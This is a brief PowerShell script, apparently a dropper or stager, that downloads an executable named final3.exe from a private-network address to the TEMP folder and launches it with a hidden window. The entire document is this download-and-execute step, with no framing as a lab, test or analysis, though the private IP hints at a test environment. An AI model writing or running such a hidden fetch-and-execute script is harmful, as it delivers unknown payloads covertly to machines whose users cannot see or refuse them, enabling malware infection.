# Define URL and destination
$url = "http://192.168.126.128:2025/final3.exe"
$destination = Join-Path $env:TEMP "final3.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $destination

# Execute the downloaded file
Start-Process -WindowStyle Hidden -FilePath $destination -Wait
